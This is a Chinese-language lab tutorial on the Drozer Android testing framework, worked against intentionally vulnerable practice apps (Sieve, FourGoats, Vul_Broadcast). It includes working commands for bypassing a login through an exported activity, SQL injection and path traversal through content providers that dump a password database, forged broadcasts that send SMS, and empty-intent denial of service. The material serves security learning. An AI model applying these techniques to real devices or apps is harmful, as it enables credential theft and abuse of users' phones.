Drozer是MWR Labs开发的一款针对Android系统的综合安全测试框架。Drozer可以通过与Dalivik 虚拟机,以及其它应用程序的IPC端点以及底层操作系统的交互，避免正处于开发阶段，或者部署于你的组织的android应用程序和设备暴露出不可接受的安全风险。

#### 环境配置

```
JDK
python
Android SDK
adb
drozer-agent(安装至Android)
drozer(PC端)
sieve.apk
fourgoats.apk
```

#### 组件及描述

![image-20200628111010674](/images/drozer/image-20200628111010674.png)

<center>部分组件概述</center>


### 环境部署

drozer部署

[drozer(PC端)下载](https://github.com/mwrlabs/drozer/releases/)

[drozer(客户端)下载](http://www.si1ent.xyz/Tools/drozer-agent-2.3.4.apk)

安装参考网上.

#### sieve

[sieve](http://www.si1ent.xyz/Tools/sieve.apk)

Sieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。
首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。

#### Vul_Broadcast

[Vul_Broadcast](http://www.si1ent.xyz/Tools/Vul_BroadcastReceiver.apk)

Vul_Broadcast是一款专门用于检测Broadcast组件安全性而设计的APP程序。

#### fourgoats

[fourgoats](http://www.si1ent/xyz/Tools/goatdroid.apk)

fourgoats是OWASP项目内一款模拟检测Broadcast组件安全性，同时也存在WebView代码执行漏洞等。

### 检测实战

以下检测因部分APP内并不都存在可导出的组件信息，所以结合网络上的APK分别测试不同组件产生的危害。

#### 0、连接

```shell
手机提前开启调试模式
adb forward tcp:31415 tcp:31415
31415
//查看连接(如下表示连接正常)
adb devices
List of devices attached
9SQ4Y9FU99999999	device
//drozer连接
drozer console connect
```

![image-20200628144434578](/images/drozer/image-20200628144434578.png)

#### 1、包名检测

```shell
dz> run app.package.list
```

![image-20200628144457885](/images/drozer/image-20200628144457885.png)

<center>部分APP</center>
#### 2、sieve实例

因Android内包名是唯一标识，所以可根据名称进行检索

```shell
dz> run app.package.list -f sieve
```

![image-20200628144824371](/images/drozer/image-20200628144824371.png)

#### 3、APP信息

```shell
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  Application Label: Sieve
  Process Name: com.mwr.example.sieve
  Version: 1.0
  Data Directory: /data/data/com.mwr.example.sieve
  APK Path: /data/app/com.mwr.example.sieve-1/base.apk
  UID: 10104
  GID: [1028, 1015, 3003]
  Shared Libraries: null
  Shared User ID: null
  Uses Permissions:
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.WRITE_EXTERNAL_STORAGE
  - android.permission.INTERNET
  Defines Permissions:
  - com.mwr.example.sieve.READ_KEYS
  - com.mwr.example.sieve.WRITE_KEYS
```

![image-20200628144936720](/images/drozer/image-20200628144936720.png)

#### 4、漏洞检测

```shell
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  2 content providers exported
  2 services exported
    is debuggable
```

![image-20200628145213646](/images/drozer/image-20200628145213646.png)

#### 5、Activities

Activities组件是Android新建APP每个功能均会存在的Activities页面；同样如果未对某些页面作限制可能导致绕过登录入口而进入某功能。

```shell
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.FileSelectActivity
    Permission: null
  com.mwr.example.sieve.MainLoginActivity
    Permission: null
  com.mwr.example.sieve.PWList	//可倒出，未设置权限认证
    Permission: null
```

![image-20200628145406392](/images/drozer/image-20200628145406392.png)

#### 6、Activities攻击

```shell
//会直接绕过登录,进入密码添加.
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```

![image-20200628145915024](/images/drozer/image-20200628145915024.png)

#### 7、ContentProvider

Android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。



```shell
dz> run scanner.provider.finduris -a com.mwr.example.sieve
```

![image-20200628151122062](/images/drozer/image-20200628151122062.png)

<center>Able to Query可查询数据</center>


#### 8、ContentProvider攻击

```shell
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
或
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
```

![image-20200628152212737](/images/drozer/image-20200628152212737.png)

<center>如上数据泄露</center>


##### 8.1、SQL注入

Android使用SQLite来存储数据，也可能造成SQL注入漏洞。

```powershell
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"			//提交单引号测试(如下报错)
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
```

![image-20200628152803161](/images/drozer/image-20200628152803161.png)

```shell
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```shell
列出数据库中所有表及相关结构信息
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';–"
```

![image-20200628153216874](/images/drozer/image-20200628153216874.png)

```shell
查询其他表
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;–"
```

![image-20200628153439019](/images/drozer/image-20200628153439019.png)



##### 8.2、目录遍历

```shell
//检测存在目录遍历
dz> run scanner.provider.traversal -a com.mwr.example.sieve
```

![image-20200628154719291](/images/drozer/image-20200628154719291.png)



##### 8.3、读取敏感信息

```shell
//读取手机内信息
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
```

![image-20200628155031780](/images/drozer/image-20200628155031780.png)

```shell
//下载文件到本地
run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db ./database.db
```

![image-20200628155519778](/images/drozer/image-20200628155519778.png)

```shell
下载是sqlite文件并保存有主密码
```

![image-20200628155856692](/images/drozer/image-20200628155856692.png)



##### 8.4、自动检测

以上了解存在SQL注入和目录遍历漏洞，同样drozer提供了自动检测以上漏洞。(建议开始检测此组件前直接扫描是否存在SQL注入、目录遍历)

```shell
//自动检测SQL注入
dz> run scanner.provider.injection -a com.mwr.example.sieve
```

![image-20200628160315252](/images/drozer/image-20200628160315252.png)

```shell
//自动检测目录遍历
dz> run scanner.provider.traversal -a com.mwr.example.sieve
```

![image-20200628160431455](/images/drozer/image-20200628160431455.png)

#### 9、Services

一个 Service 是没有界面且能长时间运行于后台的应用组件，其它应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行；另外，一个组件可以绑定到一 个service来进行交互，即使这个交互是进程间通讯也没问题.例如，一个 service 可能处理网络事物，播放音乐，执行文件 I/O，或与一个内容提供者交互，所有这些都在后台进行。

````shell
//检测service
dz> run app.service.start --action com.mwr.example.sieve.AuthService
````

#### 10、Broadcast

```shell
//检测Broadcast组件
dz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats
```

![image-20200628163232216](/images/drozer/image-20200628163232216.png)

(APK未加壳直接反编译获取指定参数)

源代码参数phoneNumber和massage，会发送Your text message has been sent!

![image-20200628190616482](/images/drozer/image-20200628190616482.png)

```shell
//发送恶意代码
dz> run app.broadcast.send --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message 123
```

![image-20200628174809779](/images/drozer/image-20200628174809779.png)

手机端提示信息发送成功提醒

<img src="/images/drozer/image-20200628174909868.png" alt="image-20200628174909868" style="zoom:50%;" />

#### 11、Vul实战

````shell
//发送恶意数据到手机号上
dz> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver --extra sting number 18225xxxxx
````

#### 12、拒绝服务

```shell
//拒绝服务分两种空 actoin 和空 extras
//空action
dz> run app.broadcast.send --component com.isi.vul_broadcastreceiver com.isi.vul_broadcastreceiver.MyBroadCastReceiver
//空extras
dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS
```

<img src="/images/drozer/image-20200628194446420.png" alt="image-20200628194446420" style="zoom:50%;" />

### WebView代码执行检测

1、检测模版安装

开启检测前需提前安装模块`checkjavascriptbridge`

```shell
dz> module install jubax.javascript
```

![image-20200628200631521](/images/drozer/image-20200628200631521.png)

2、执行命令检测手机内所有APP

```shell
dz> run scanner.misc.checkjavascriptbridge
```

![image-20200628200729336](/images/drozer/image-20200628200729336.png)

如果漏洞存在会提醒

![image-20200628200810091](/images/drozer/image-20200628200810091.png)

### 总结

以上总结其实网络上也有很多，只是想总结出来后让自己能明白和了解到关于Android应用组件的检测项及涉及工具。当然Drozer这款综合型检测框架还有很多值得学习，比如写一些模块让检测更加自动化。

### 参考

````shell
http://showmeshell.top/2018/09/28/How-to-use-drozer/
https://bbs.pediy.com/thread-219107.htm
````
